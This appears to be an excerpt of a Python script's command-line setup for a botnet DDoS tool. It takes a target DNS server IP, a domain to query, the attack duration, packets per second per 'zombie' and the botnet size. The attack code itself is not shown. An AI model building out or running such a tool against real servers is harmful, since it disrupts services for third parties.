...
if __name__ == '__main__':
    ...
    parser.add_argument('-s', '--server_ip', help = 'Server ip, default:203.119.73.80 ', default='203.119.73.80')
    parser.add_argument('-sp', '--source_port', help = 'Source port, default:21517', type= int, default=21517)
    parser.add_argument('-d', '--duration', help = ' Duration of the attack (seconds), default: 200 sec.', type=int, default=200)
    parser.add_argument('-n', '--num_packets', help= 'Amount of packets per second per zombie, default: 20', type=int, default=20)
    ...
    parser.add_argument('-z', '--zombies', help='Number of computers in the botnet for the DDoS attack, default:10', type=int, default = 10)
    ...
    requiredNamed.add_argument('-dom','--domain', help= 'Asked domain, ex: "vnnic.vn."', required=True)
